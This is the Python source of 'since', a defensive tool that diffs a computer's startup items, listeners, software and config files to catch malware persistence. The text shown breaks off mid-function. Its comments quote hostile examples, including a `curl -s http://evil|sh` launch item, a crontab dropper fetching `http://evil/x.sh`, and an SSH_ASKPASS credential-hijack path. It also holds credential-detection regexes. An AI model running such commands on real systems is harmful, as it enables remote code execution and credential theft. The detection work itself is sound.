#!/usr/bin/env python3
"""
since — a plain-language daily diff of your computer.

One command that answers: "what's different about my machine since I last looked?"
It snapshots the things that quietly change under you — startup/background items,
listening network services, installed software, big new files, and sensitive system
files (shell config, hosts, cron, DNS/proxy) — ranks each change by how much you
should care, tells you *why* it probably happened, and offers the undo command.

Good for catching *both* malware persistence (a new LaunchAgent, a new listener, an
edited ~/.zshrc) *and* your own forgotten `brew install` from three weeks ago.

Common commands:
    since                 diff live state against the most recent snapshot, then save
    since --since 1d      diff against the newest snapshot at least 1 day old
    since --since monday  natural-language time windows ("yesterday", "3 hours ago")
    since --since <label> diff against a named checkpoint (see `mark`)
    since mark <label>    save a named checkpoint of right now
    since ack             mark current state as normal (start fresh from here)
    since ignore <pat>    stop alerting on a noisy path/process/category
    since snapshot        just capture a snapshot (put this in a daily job)
    since digest --notify diff + macOS notification if anything's worth a look
    since list            list saved snapshots
    since caps            show what's covered and what needs sudo
    since --json          machine-readable diff   |   since --all  include quiet churn

Most features need no privileges. A few see more with root — `sudo since` reveals
system/root-owned listeners and monitors /etc/sudoers; run `since caps` for the list.
Don't mix privilege levels between snapshots; since detects a mismatch and skips the
affected categories rather than showing false changes.

Zero dependencies: pure Python 3 stdlib + OS tools. No sudo required.
State lives in ~/.local/state/since/ (mode 600, never in the repo).

macOS and Linux are both supported (verified on real boxes). The collector layer is
platform-abstracted — per-OS backends feed one common schema, with platform-appropriate
labels, undo hints, and desktop notifications (osascript / notify-send).
"""

from __future__ import annotations

import argparse
import difflib
import fnmatch
import glob
import hashlib
import json
import os
import platform as platform_module   # hostname without Unix-only os.uname()
import re
import shlex
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from datetime import datetime, timedelta
from pathlib import Path

__version__ = "0.4.5"
SCHEMA_VERSION = 5   # 4: snap['tools'] (tool identity); 5: snap['blob_flags']

if sys.version_info < (3, 9):  # uses PEP 585 generics in annotations + os.replace
    sys.exit("since requires Python 3.9 or newer")

HOME = Path.home()
STATE_DIR = Path(os.environ.get("SINCE_STATE_DIR", HOME / ".local/state/since"))
SNAP_DIR = STATE_DIR / "snapshots"
LABELS_FILE = STATE_DIR / "labels.json"
IGNORE_FILE = STATE_DIR / "ignore.txt"
KEEP_SNAPSHOTS = 90

PLATFORM = "macos" if sys.platform == "darwin" else "linux" if sys.platform.startswith("linux") else sys.platform

# severity levels (higher = louder)
RED, ORANGE, YELLOW, GREEN = 3, 2, 1, 0
LEVEL_NAME = {RED: "critical", ORANGE: "notable", YELLOW: "minor", GREEN: "info"}

# getattr, not os.geteuid() directly: geteuid/uname are Unix-only, so on win32 the module
# crashed at IMPORT — the honest "UNSUPPORTED PLATFORM" notice never got the chance to print.
EUID = os.geteuid() if hasattr(os, "geteuid") else -1
IS_ROOT = (EUID == 0)

# Collectors whose visibility depends on privilege. Without root, `lsof` on macOS
# only shows the current user's own sockets — root-owned/system listeners are hidden.
# A root snapshot and a non-root snapshot are therefore NOT directly comparable for
# these categories (every system listener would look added/removed), so the diff
# suppresses them across a privilege mismatch to avoid false alarms.
PRIV_SENSITIVE_CATS = ("listening", "outbound")

# What `sudo` unlocks, for the `caps` command and the non-root footer.
# (feature, why-root-helps, state-without-root)
ROOT_FEATURES = [
    ("Listening services", "lsof shows only your own sockets; system/root listeners are hidden", "partial"),
    ("Outbound connections", "same — only your processes' sockets are visible", "partial"),
    ("/etc/sudoers", "unreadable as a normal user, so edits to it aren't monitored", "missing"),
    ("Background Task Mgmt", "full persistence DB needs `sudo sfltool dumpbtm` (also not yet implemented)", "partial"),
]

# ---------------------------------------------------------------------------
# small helpers
# ---------------------------------------------------------------------------

def run(cmd, timeout=15, merge=False):
    """Run a command; return stdout (or stdout+stderr if merge). "" on any failure."""
    try:
        p = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout, errors="replace",
        )
        return (p.stdout + p.stderr) if merge else p.stdout
    except Exception:
        return ""


def sha(text: str) -> str:
    return hashlib.sha256(text.encode("utf-8", "replace")).hexdigest()[:16]


def human_size(n: int) -> str:
    f = float(n)
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if f < 1024 or unit == "TB":
            return f"{f:.0f} {unit}" if unit == "B" else f"{f:.1f} {unit}"
        f /= 1024
    return f"{f:.1f} TB"


def human_duration(seconds: float) -> str:
    seconds = abs(seconds)
    if seconds < 90:
        return "moments"
    mins = seconds / 60
    if mins < 90:
        return f"about {round(mins)} minutes"
    hours = mins / 60
    if hours < 36:
        return f"about {round(hours)} hours"
    return f"about {round(hours / 24)} days"


def tilde(p: str) -> str:
    # Only collapse a LEADING $HOME — replacing every occurrence turns a path like
    # /Users/me/data/Users/me/file into a nonsensical ~/data~/file.
    h = str(HOME)
    if p == h:
        return "~"
    if p.startswith(h + os.sep):
        return "~" + p[len(h):]
    return p


MAX_ARGV = 64 * 1024         # scanned in full (chunked + literal-prefiltered); see _enrich
MAX_READ = 8 * 1024 * 1024   # plists/.desktop/manifests/rc files are KBs; 8MB is generous
DIFF_MAX_LINES = 20_000      # above this, report the change without a quadratic line diff
DIFF_MAX_BYTES = 1024 * 1024
# Per-blob storage cap. Blobs are stored VERBATIM in every snapshot, so 13 tracked rc files
# at the 8MB read cap meant ~109MB per snapshot and ~9.6GB across KEEP_SNAPSHOTS=90. Keep a
# head plus a hash of the WHOLE content, so a change past the cap is still detected.
BLOB_MAX = 256 * 1024

def safe_read_bytes(path, limit: int | None = None, tail: bool = False):
    """Read at most `limit` bytes from a REGULAR file, else None. The ONLY way a collector
    may touch a path it found by globbing a user-writable directory, because a plain
    `read_bytes()` there is TWO denial-of-service vectors, both free to plant for any
    process running as the user, and both fatal to an unattended `digest --notify` (it dies
    before printing, saving a snapshot or notifying — a silently blinded watchdog):
      * a FIFO — or a symlink to /dev/zero — blocks the read FOREVER. O_NONBLOCK plus an
        S_ISREG check on the FD (not on the path, so a check-then-swap race cannot beat it)
        makes that impossible.
      * a multi-GB SPARSE file costs the attacker nothing to create and cost us its full
        length in RAM: a planted 2GB plist measured 4.1GB peak RSS. The read is capped.
    `tail=True` reads the LAST `limit` bytes — for shell history, where recency is the point.
    `limit` defaults to MAX_READ at CALL time (not definition time), so the cap stays tunable."""
    limit = MAX_READ if limit is None else limit
    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NONBLOCK", 0))
    except OSError:
        return None
    try:
        st = os.fstat(fd)
        if not stat.S_ISREG(st.st_mode):
            return None
        cut = tail and st.st_size > limit
        if cut:
            os.lseek(fd, -limit, os.SEEK_END)
        chunks, got = [], 0
        while got < limit:
            chunk = os.read(fd, min(1 << 16, limit - got))
            if not chunk:
                break
            chunks.append(chunk)
            got += len(chunk)
        data = b"".join(chunks)
        # a tailed read lands mid-line; drop that fragment so callers never parse half a
        # command as a whole one (it would show up as a bogus `why:` attribution).
        return data.partition(b"\n")[2] if cut else data
    except OSError:
        return None
    finally:
        os.close(fd)


def safe_read_text(path, limit: int | None = None, tail: bool = False):
    """safe_read_bytes, decoded as UTF-8 with replacement (never raises). None if unreadable."""
    data = safe_read_bytes(path, limit, tail)
    return None if data is None else data.decode("utf-8", "replace")


def is_regular(p) -> bool:
    """True only for a REGULAR file (symlinks followed) — a cheap pre-filter for candidate
    paths. For READING, use safe_read_* instead: this check is racy on its own and says
    nothing about size."""
    try:
        return Path(p).is_file()
    except OSError:
        return False


# Suffixes WE append to a collector key so same-named items from different sources stay
# distinct (`Foo (cask)` vs the formula, `Foo (~/Applications)` vs /Applications,
# `x.desktop (system)` vs the ~/.config copy). They are part of the key's IDENTITY — but a
# filesystem path (the trust check) or a whole-word history match (attribution) needs the
# PLAIN name: with the suffix, `_enrich` built `…/Foo (~/Applications).app`, a path that
# never exists, so trust_of() returned (None, False) and an unsigned app there never
# escalated to RED. bare_key strips exactly these tags, never a name's own parentheses.
USER_APPS_TAG = " (~/Applications)"
SYS_AUTOSTART_TAG = " (system)"
KEY_TAGS = (USER_APPS_TAG, SYS_AUTOSTART_TAG, " (cask)", " (snap)", " (flatpak)")

def bare_key(key: str) -> str:
    for t in KEY_TAGS:
        if key.endswith(t):
            return key[:-len(t)]
    return key


# The tool's INPUT is potentially malware-controlled (plist filenames, process
# names, file contents…). Two dangers when we echo those back:
#  1. terminal-escape injection — a crafted name/diff line can hide the very
#     change it describes, or spoof a "signature: Apple-signed" line. Strip all
#     C0 controls + ESC before anything reaches the terminal.
#  2. shell/AppleScript injection via the copy-paste `undo:` hints. Never build a
#     runnable command by string-interpolating an untrusted name; shlex-quote it.
# Strip C0 controls that CAN forge output — \n \r (inject extra lines / a fake
# "signature: Apple-signed" or "undo:" line), ESC, and DEL/C1 — plus the Unicode format
# chars used for output spoofing: bidi overrides (Trojan-Source), zero-width chars, BOM,
# line/paragraph separators (U+2028/U+2029), and lone UTF-16 surrogates (a non-UTF-8
# Linux filename reaches us via surrogateescape and would otherwise raise
# UnicodeEncodeError when printed, killing the whole report). TAB (\x09) is deliberately
# KEPT: it cannot forge a line, and stripping it mangled tab-indented config diffs.
_CTRL_RE = re.compile(
    r"[\x00-\x08\x0a-\x1f\x7f-\x9f\ud800-\udfff"
    r"\u200b-\u200f\u2028\u2029\u202a-\u202e\u2066-\u2069\ufeff]")

def clean(s) -> str:
    """Neutralize terminal control/escape/format chars in any attacker-derived string."""
    return _CTRL_RE.sub("�", s if isinstance(s, str) else str(s))


def q(s: str) -> str:
    """Shell-quote an untrusted value for a copy-paste command."""
    return shlex.quote(s)


# Redact obvious secret material before it reaches the terminal / daily.log.
# The point of a config diff is "a line was added to ~/.npmrc" — not to reprint
# the token in that line where it can be shoulder-surfed or logged.
_PEM_RE = re.compile(r"(?i)-----BEGIN [A-Z ]*PRIVATE KEY-----")
# key=value where the key NAME contains a sensitive word — covers underscore forms
# (GITHUB_TOKEN, aws_secret_access_key, API_KEY, SSHPASS). Value = REST of line
# (multi-token), so "Authorization: Bearer <jwt>" doesn't leak the token past the first
# word. Both word-char runs are BOUNDED ({0,64}) — an unbounded `[\w.\-]*` on each side
# is catastrophically quadratic, and a long base64-ish line in a tracked rc file could
# stall the unattended `digest --notify` for minutes (attacker-plantable DoS).
# The keyword alternation is a SHARED constant, interpolated into both the matcher and the
# cheap pre-filter below, so the two can NEVER drift apart — a keyword present in one but
# not the other would silently stop redacting that key (a leak by omission).
_SECRET_KW = (r"secret|pass(?:wd|word|phrase)?|[_-]pwd|token|api[_-]?key|access[_-]?key|"
              r"client[_-]?secret|private[_-]?key|authoriz|[_-]auth|credential|"
              r"oauth2?[_-]?bearer")
# ONE assignment: a credential-ish KEY, a separator, and a value that STOPS at the first
# whitespace or shell separator (or spans a quoted run, which is atomic).
#
# This bound is the whole design. The previous matcher took the value as `(\S.*)$` —
# rest-of-line — and every bug in this function's history followed from it: a "show" decision
# exempted every later secret on the line, a "mask" decision swallowed the rest of the attack,
# and the recursive rescan bolted on to fix the first half became an unprivileged kill switch
# (RecursionError on ~800 keys in one line). With a single-token value, `re.sub` simply
# continues scanning after each match, so every assignment on a line is decided INDEPENDENTLY
# with no recursion, no depth cap, and no tail semantics to get wrong.
# {0,4096}, not {0,512}: the input is already capped at _REDACT_MAX, so a wider bound costs
# nothing, and at 512 a longer quoted value fell through to the unquoted branch and printed its
# tail (`password="AAA…520… <secret>"`).
_VALUE = (r'"(?:[^"\\\n]|\\.){0,4096}"' r"|'(?:[^'\\\n]|\\.){0,4096}'" r"|[^\s;&|]+")
_ASSIGN_RE = re.compile(r"(?i)(?P<key>[\w.\-]{0,64}(?:" + _SECRET_KW + r")[\w.\-]{0,64})"
                        r"(?P<sep>\s*[:=][:=>]{0,2}\s*(?:[\"']{2}\s*)?|\s+)"
                        r"(?P<val>" + _VALUE + r")")
# Linear, backtrack-free pre-filter: _ASSIGN_RE can only match where one of these keywords is,
# but its bounded `[\w.\-]{0,64}` runs are retried at every offset. Sound by construction —
# any _ASSIGN_RE match implies a _KV_KW_RE match on the same line.
_KV_KW_RE = re.compile("(?i)" + _SECRET_KW)
_SCHEME_RE = re.compile(
    r"(?i)\b(bearer|basic|token|apikey|api-key|digest|negotiate)\s+([A-Za-z0-9._~+/=-]{6,})")
# …and the general case, because naming schemes can never be complete: under a credential-named
# key, a bare alphabetic WORD is a scheme, so the secret is the token AFTER it. The single-token
# assignment scan masks only the first token, so `header = "Authorization: SSWS <token>"` (Okta;
# also NTLM, HMAC, and any vendor scheme) masked "SSWS" and printed the credential. `.curlrc` and
# `.wgetrc` are tracked files where exactly this line lives. Bounded runs; linear.
_KEYED_SCHEME_RE = re.compile(
    r"(?i)(?P<head>(?:" + _SECRET_KW + r")[\w.\-]{0,64}\s*[:=]\s*"
    r"(?P<scheme>[A-Za-z][A-Za-z0-9-]{1,64})[ \t]+)(?P<tok>[A-Za-z0-9._~+/=-]{6,})")
# NOT extended to the whitespace-separated spelling (`Authorization HMAC <secret>`). Tried and
# reverted: with whitespace, the "scheme" slot is indistinguishable from the VALUE slot, so the
# rule masked `pam_deny.so` in `password sufficient pam_deny.so` and — far worse — masked the
# wrong token while leaving the real secret in place (19 property cases). Header credentials use
# a colon, and the tracked files use `key = value` or `Key value` directives, so the colon form
# above is the one that occurs. Residual: `Authorization HMAC <secret>` is shown.
_URLAUTH_RE = re.compile(r"://([^/\s:@]+):([^/\s@]+)@")                      # user:pass@host
# `https://<token>@github.com/...` — the standard way to embed a GitHub/GitLab PAT, and
# `.gitconfig` is tracked. No colon, so _URLAUTH_RE never saw it. Length+entropy gated so
# `ssh://averylongusername@host` stays readable.
_URLTOKEN_RE = re.compile(r"://([^/\s:@]{12,})@")
# curl .curlrc credentials: `user = "name:password"`, `-u name:password`,
# `--proxy-user u:p`. The password is the part after the first colon in the user field —
# NOT a `://…@` URL, so _URLAUTH_RE misses it. Keep the username for context, mask the pass.
# NOTE the anchor allows a leading unified-diff marker (`+`/`-`): redact() runs on diff
# lines, and a bare `(?:^|\s)` would let `+user = "u:pw"` slip through unredacted.
_USERPASS_RE = re.compile(
    r'(?i)((?:^|[\s+-])(?:-u|--user|--proxy-user|user|username)\s*=?\s*"?[^"\s:]+:)([^"\s]+)')
_TOKEN_RE = re.compile(                                                     # standalone tokens
    r"\bAKIA[0-9A-Z]{16}\b|\bsk_(?:live|test)_[A-Za-z0-9]{8,}\b|\bgh[pousr]_[A-Za-z0-9]{20,}\b|"
    r"\bxox[baprs]-[A-Za-z0-9-]{8,}\b|\beyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\b")
# Credentials passed as a command-line FLAG, where the secret is the NEXT token rather than
# a `key=value`: `sshpass -p hunter2`, `mysql -pSECRET`. The attached form was already caught
# (the key name absorbed it) but the documented spaced form printed verbatim in a crontab.
# Anchored, bounded, no nested quantifier — linear.
_CMDPASS_RE = re.compile(
    r"(?i)(\b(?:sshpass\s+-p|sshpass\s+--password[= ]|--password[= ]|--token[= ]|"
    r"mysql(?:dump|admin)?\s+(?:-\w+(?:[= ]\S+)?\s+){0,4}-p)\s*)(\S+)")
_B64LINE_RE = re.compile(r"^[A-Za-z0-9+/]{40,}={0,2}$")                     # PEM body / raw key
_KW_VALUES = {"yes", "no", "true", "false", "none", "null", "required",
              "optional", "default", "auto", "inherit", "prohibit-password"}
# Keys whose VALUE is the credential itself (an assignment `password=…`, `_authToken:…`).
# Distinct from a directive NAME that merely contains "authoriz"/"_auth"
# (`AuthorizedKeysFile`, `AuthorizedKeysCommandUser`) — those we must SHOW.
# `authorization` (whole word) is HARD — an `Authorization: <token>` header IS the
# credential. It does NOT collide with the SOFT `Authorized*` sshd directives: they
# diverge at index 8 (`authoriza…` vs `authorize…`), so `AuthorizedKeysFile` stays visible.
_HARD_SECRET_RE = re.compile(
    r"(?i)(secret|pass(?:wd|word|phrase)?|[_-]pwd|sshpass|token|api[_-]?key|access[_-]?key|"
    r"client[_-]?secret|private[_-]?key|credential|[_-]auth|authorization|"
    r"oauth2?[_-]?bearer)")   # `_auth` = npm .npmrc basic-auth field; `_pwd` = MYSQL_PWD
# sudoers TAGS are grants, not secrets: `PASSWD:`/`NOPASSWD:` prefix a COMMAND list
# (`PASSWD: /tmp/miner`, `PASSWD: ALL`) — redacting it hides the very attack we exist to
# show. Deliberately shape-narrow (uppercase tag + colon + command-shaped value) so an
# assignment (`PASSWD=hunter2`) or a YAML-ish `PASSWD: hunter2` still redacts.
_SUDO_TAGS = ("PASSWD", "NOPASSWD")
# Reporting `signature: Apple-signed` for a launch item whose Program is /bin/sh actively
# reassures the reader about a malicious payload: that signature is the INTERPRETER's, and every
# interpreter on the box is legitimately signed. Name the interpreter instead.
_INTERPRETERS = ("sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", "fish", "env",
                 "perl", "ruby", "osascript", "node", "php", "lua", "tclsh", "expect")
# A sudoers command spec: `ALL`, an absolute path, or a negated one — optionally followed by
# more TAGS (`PASSWD:NOEXEC: /tmp/miner`) or a comma list (`ALL, !/usr/bin/su`). The v0.4.3
# gate tested only `tok == "ALL" or tok[0] in "/!"`, so both ordinary spellings still had the
# granted command list redacted away — the single most important thing in a sudoers diff.
# `ALL` must be followed by end/space/comma — NOT ':' or '=': `NOPASSWD: ALL=<secret>` was
# accepted as a command spec and exempted the whole value. (`\b` was even looser.)
_SUDO_CMD_RE = re.compile(r"^(?:ALL(?=$|[\s,])|[/!])")
# No re.I: sudoers tags are UPPERCASE by spec, and case-insensitivity let a lowercase token
# pose as "a further tag" and exempt the rest of the line (`NOPASSWD: passwd: <secret>`).
_SUDO_TAG_RE = re.compile(r"^(?:NO)?(?:PASSWD|EXEC|SETENV|LOG_INPUT|LOG_OUTPUT|"
                          r"MAIL|FOLLOW|INTERCEPT):")
# Keys whose VALUE is a FILESYSTEM PATH even though the key names a credential: every one is
# a known credential-theft / agent-hijack technique when planted in a tracked rc file
# (SSH_ASKPASS=/tmp/steal.sh, SSH_AUTH_SOCK=/tmp/.evil/agent.sock, PGPASSFILE=…), and the
# path IS the finding. The unconditional `=`/`:` redaction concealed them completely.
# A real filesystem path, i.e. one with a directory separator — NOT merely "starts with / ~ $".
# The looser test leaked: a base64 secret starts with '/' about 1 time in 64 and every
# crypt/bcrypt hash starts with '$', so `SECRET_FILE=/hunter2…` printed in cleartext.
# A real filesystem path: needs a directory separator, OR is a single absolute segment of low
# entropy (`SSH_ASKPASS=/evil` is a genuine hijack shape; `SECRET_FILE=/hunter2Xyz9` has 4
# character classes and stays masked).
_REAL_PATH_RE = re.compile(r"^(?:/[^/\s]+/|~/|\./|\.\./|\$\{?\w+\}?/)")
_SIMPLE_PATH_RE = re.compile(r"^/[^/\s]+$")
# `$VAR` / `${VAR}` in full: a reference, not a value. Requires a LETTER or '_' first, so a
# crypt/shadow hash (`$6$rounds$…`) is not mistaken for one and still redacts.
_VAR_REF_RE = re.compile(r"^\$\{?[A-Za-z_]\w*\}?$")
_PATH_VALUED_KEY_RE = re.compile(
    r"(?i)(askpass|passfile|pass_file|keysfile|keyscommand|[_-]sock$|_socket$|"
    r"[_-]file$|[_-]dir$|[_-]path$)")
_REDACT_MAX = 4096

_SHOW_MAX_DEPTH = 8    # bounds the tail rescan; at the cap redact rather than recurse

def _sudo_cmd_spec(tok: str) -> bool:
    """True if `tok` opens a sudoers COMMAND SPEC: a further tag (`NOEXEC:`), or `ALL` /
    (negated) absolute paths, possibly as a comma list. Checking only the first element let
    `PASSWD: ALL,<secret>` through, because the gate then exempts the whole remainder."""
    if _SUDO_TAG_RE.match(tok):
        return True
    parts = [p.strip() for p in tok.split(",") if p.strip()]
    return bool(parts) and all(_SUDO_CMD_RE.match(p) for p in parts)


def _char_classes(tok: str) -> int:
    return sum(bool(re.search(p, tok)) for p in (r"[a-z]", r"[A-Z]", r"[0-9]", r"[^A-Za-z0-9]"))

def _is_directive_value(tok: str) -> bool:
    """A value we must SHOW even under a credential-named key: a filesystem PATH, a shell
    var-ref, or a known config KEYWORD. These are exactly the sshd/sudoers changes the
    tool exists to surface (`AuthorizedKeysFile /tmp/evil/keys`, `PasswordAuthentication no`)."""
    return (tok[:1] in "/~$") or tok.startswith("./") or (tok.lower() in _KW_VALUES)

def redact(line: str) -> str:
    # Bound the work ABSOLUTELY by capping the input. Every regex below is linear now
    # (v2 #1 fixed the quadratic one) but carries a real ~5µs/char constant, and `--json`
    # redacts EVERY diff line — a tracked rc file with a few hundred KB of long lines
    # (planted, or a generated .zshrc) would stall the unattended digest for tens of
    # seconds. Truncating also fails SAFE: the dropped tail is never printed at all, so
    # an un-scanned secret can't ride along behind the cap.
    if len(line) > _REDACT_MAX:
        return (redact(line[:_REDACT_MAX])
                + f" …(+{len(line) - _REDACT_MAX} chars, truncated)")
    # PEM body / raw key material on EITHER side of a unified diff. The char class is
    # +-agnostic, so strip the one-char diff marker before testing — otherwise a key
    # body printed raw on a `-` (removed) line while the `+` line is redacted.
    # NOTE the tuple: `line[:1] in "+-"` is ALSO true for the empty string ("" is a substring
    # of everything), so redact("") raised IndexError — found by the no-raise property test.
    # The marker is NOT stripped from `line` itself: a body can legitimately begin with '-'
    # (a `.curlrc` `-u user:pass` line), and eating that character broke its masking.
    marker = line[0] if line[:1] in ("+", "-") else ""
    core = line[1:] if marker else line
    if _B64LINE_RE.match(core.strip()):
        return f"{marker}«redacted (key material)»"
    line = _PEM_RE.sub("-----BEGIN PRIVATE KEY----- «redacted»", line)
    # only redact a bearer/basic token that is actually high-entropy — plain prose like
    # "# basic networking setup" must not become "# basic «redacted» setup".
    line = _SCHEME_RE.sub(
        lambda m: f"{m.group(1)} «redacted»" if _char_classes(m.group(2)) >= 2 else m.group(0), line)
    def _keyed_scheme(m):
        # The word must actually look like a SCHEME and the next token like a SECRET. Without
        # both guards this misfired on `PasswordAuthentication=yes API-KEY: <secret>`: it read
        # "yes" as a scheme, masked the harmless "API-KEY" and left the real credential.
        if (m.group("scheme").lower() in _KW_VALUES
                or _char_classes(m.group("tok")) < 2):
            return m.group(0)
        return f"{m.group('head')}«redacted»"
    line = _KEYED_SCHEME_RE.sub(_keyed_scheme, line)
    line = _URLAUTH_RE.sub(r"://\1:«redacted»@", line)
    line = _URLTOKEN_RE.sub(
        lambda m: "://«redacted»@" if _char_classes(m.group(1)) >= 2 else m.group(0), line)
    line = _CMDPASS_RE.sub(lambda m: f"{m.group(1)}«redacted»", line)
    line = _USERPASS_RE.sub(r"\1«redacted»", line)
    line = _TOKEN_RE.sub("«redacted»", line)

    # ---- assignment pass: every `key<sep>value` on the line, decided INDEPENDENTLY ----
    # The decision table, in order. Each rule states WHY, because every one of them exists
    # because its absence caused a real leak or hid a real attack:
    #
    #   1. key is a PATH COMPONENT (preceded by '/', whitespace separator)   -> SHOW
    #      `NOPASSWD: /usr/bin/passwd backdoor2026` — the "key" is the granted command and the
    #      "value" is its argument; masking it hid which account gets reset. Whitespace only:
    #      `//registry.npmjs.org/_authToken=<secret>` is an assignment, not a path.
    #   2. key is a sudoers TAG and the value opens a command spec                -> SHOW
    #      The granted command list is the payload of a sudoers diff.
    #   3. key NAMES a credential (HARD):
    #        assignment separator ('=' / ':')                                     -> MASK
    #          except a config keyword (`PasswordAuthentication=yes`) or a real path under a
    #          path-valued key (`SSH_ASKPASS=/tmp/steal.sh`) — both are the attack itself.
    #        whitespace separator: prose or a directive (`password required pam_unix.so`,
    #          `PASS_MAX_DAYS 99999`)                                             -> SHOW
    #          unless the value is credential-shaped (>=6 chars, >=2 char classes).
    #   4. key merely CONTAINS a directive name (`AuthorizedKeysFile`, SOFT)      -> SHOW
    def _assignment(m):
        key, sep, val = m.group("key"), m.group("sep"), m.group("val")
        # A leading diff marker can join the key, because '-' is in the key's char class:
        # `-AuthorizedKeysFile` turned the SOFT `Authorized*` directive into a HARD `[_-]auth`
        # match, so the `-` (removed) form was REDACTED while the `+` form was shown. Classify
        # on the marker-free key so no rule can depend on which side of the diff it came from.
        kcls = key.lstrip("+-")          # for CLASSIFICATION only
        bare = val.strip("\"'")
        masked = f"{key}{sep}«redacted»"  # output keeps the original key, marker included
        assigned = (":" in sep) or ("=" in sep)

        # (The former rule 1 — "a key preceded by '/' is a path component, show it" — is GONE.
        # It leaked a token passed as argv to a credential-named script: `*/5 * * * *
        # /opt/bin/refresh_token <secret>` and `/etc/foo/api_key <secret>` printed in cleartext.
        # There is no structural difference between that and `/tmp/token_stealer.sh <host>`, so
        # the tie is broken toward NOT leaking: the following token is masked, and the line still
        # names the script and the grant. The case the rule was added for — `NOPASSWD:
        # /usr/bin/passwd backdoor2026` — is unaffected: rule 1 below consumes the command path
        # as the tag's value, so the account name is never scanned as a value at all.)
        if kcls in _SUDO_TAGS and ":" in sep and _sudo_cmd_spec(bare):
            return m.group(0)                                              # 2
        if _HARD_SECRET_RE.search(kcls):                                    # 3
            if assigned:
                # NO var-ref exemption here, deliberately: `SSHPASS=$ecretPassw0rd` and
                # `API_KEY_FILE=$hunter2Xyz9` are indistinguishable from `$VAR` by shape, and
                # v0.4.2 already shipped that leak once. Under an assignment a HARD key's value
                # is the secret unless it is a config keyword or a real path under a
                # path-valued key. (The whitespace branch below can afford the exemption: its
                # values are directives, e.g. nginx `Authorization $http_authorization;`.)
                if (bare.lower() in _KW_VALUES
                        or (_PATH_VALUED_KEY_RE.search(kcls)
                            and (_REAL_PATH_RE.match(bare)
                                 or (_SIMPLE_PATH_RE.match(bare) and _char_classes(bare) < 3)))):
                    return m.group(0)
                return masked
            # keyword / short / single-class only. NOT "starts with / ~ $": that first-char
            # test showed `CREDENTIAL /t_wvSrE+2I.23-VqI33q` in cleartext (property test P1).
            # Legitimate whitespace-separated directive values are keywords or numbers
            # (`password required pam_unix.so`, `PASS_MAX_DAYS 99999`), never paths.
            # A real PATH or URL is the payload, not the secret: masking it meant an attacker
            # naming their dropper `*token*`/`*api_key*` made its download URL vanish from the
            # crontab diff (`/opt/bin/refresh_token http://evil/x.sh` -> «redacted»). A raw
            # credential matches neither pattern, so the P1 leak stays closed.
            if (bare.lower() in _KW_VALUES or _VAR_REF_RE.match(bare)
                    or bare.startswith(("http://", "https://", "!"))
                    # a path ONLY when it is low-entropy: base64 uses '/' and '+', so
                    # `_auth /J.9V3dlL6/_u_46b273Sa8U/E+=h…` matched "looks like a path" and
                    # printed the token — the P1 leak, returning through the H2 exemption.
                    or (_REAL_PATH_RE.match(bare) and _char_classes(bare) <= 2
                        and not any(c in bare for c in "+="))
                    or len(bare) < 6 or _char_classes(bare) < 2):
                return m.group(0)
            return masked
        return m.group(0)                                                  # 4

    # KNOWN RESIDUAL: `;`, `&` and `|` end a value token, so a password CONTAINING one is masked
    # only up to that character (`password = Tr0ub&dor3-Xyz` -> `«redacted»&dor3-Xyz`). The token
    # boundary is what lets `SSH_ASKPASS=/tmp/a.sh;MYSQL_PWD=<secret>` be judged as two separate
    # assignments, and `A&B` (one value) is structurally identical to `A;cmd` (two statements), so
    # a post-pass that swallows the remainder eats real shell separators — measured: it broke
    # compositionality on 25 property cases. Masking to whitespace instead reopens the chained
    # leak, and per-separator rescanning is the recursion that became a kill switch. Left as-is
    # deliberately; the exposure is a PARTIAL secret, and the `«redacted»` marker is present.
    return _ASSIGN_RE.sub(_assignment, line) if _KV_KW_RE.search(line) else line


# ---------------------------------------------------------------------------
# trust / signing (macOS) — used to enrich findings at diff time, not per snapshot
# ---------------------------------------------------------------------------

def trust_of(path: str):
    """Return (label, suspicious) for a binary/app path. Best-effort, macOS."""
    # isinstance: `path` comes from an attacker-writable plist via program_of_plist, so a
    # list/dict here made os.path.exists raise TypeError (which is NOT an OSError) and
    # killed the whole run — diff-time code gets no failure isolation.
    if PLATFORM != "macos" or not isinstance(path, str) or not path:
        return (None, False)
    # a non-regular target (FIFO/device planted as `Evil.app`) makes `codesign` block for
    # its full 10s timeout; N planted files cost N x 10s of the daily job for nothing.
    if not (is_regular(path) or os.path.isdir(path)):
        return (None, False)
    if not os.path.exists(path):
        return (None, False)
    info = run(["codesign", "-dv", "--verbose=2", path], merge=True, timeout=10)
    low = info.lower()
    if "not signed" in low or "code object is not signed" in low:
        return ("unsigned", True)
    authorities = [l.split("=", 1)[1].strip() for l in info.splitlines() if l.startswith("Authority=")]
    if not authorities and ("adhoc" in low or "linker-signed" in low):
        return ("ad-hoc signed", True)
    if any("Apple" in a for a in authorities):
        # An Apple-signed Mach-O living outside the system paths is a COPY. `cp /bin/sh
        # ~/Library/.../SoftwareUpdateHelper` keeps the signature intact, so a basename check for
        # interpreters missed it and the report printed a reassuring "Apple-signed" next to
        # attacker-planted persistence. Apple does not ship binaries into user directories.
        if not path.startswith(("/System/", "/usr/", "/bin/", "/sbin/", "/Library/Apple/",
                                "/Applications/Utilities/", "/Applications/")):
            return ("Apple-signed binary COPIED outside the system paths", True)
        return ("Apple-signed", False)
    if any("Developer ID" in a for a in authorities):
        acc = run(["spctl", "-a", "-vv", path], merge=True, timeout=10).lower()
        return ("Developer ID" + (", notarized" if "notarized" in acc else ""), False)
    if authorities:
        return (f"signed ({authorities[0][:24]})", False)
    return ("unknown", False)


def plist_program_and_argv(plist_path: str):
    """(program, full argv string) from a launchd plist. The argv matters as much as the
    program: `ProgramArguments = ["/bin/sh","-c","curl -s http://evil|sh"]` resolves to
    /bin/sh, which is genuinely Apple-signed — so the report printed "signature: Apple-signed"
    next to a malicious startup item, which is worse than saying nothing. The caller scans the
    argv for malicious patterns so the interpreter's own signature can't launder the payload."""
    real = plist_path.replace("~", str(HOME), 1) if plist_path.startswith("~") else plist_path
    # Size-gate BEFORE spawning plutil: its output is read into memory, so a planted 500MB
    # plist cost 2.27GB RSS at diff time (the collector read path is capped for this reason;
    # this one was not). The 8s timeout does not bind — the work is linear, not slow.
    try:
        if not is_regular(real) or os.path.getsize(real) > MAX_READ:
            return (None, "")
    except OSError:
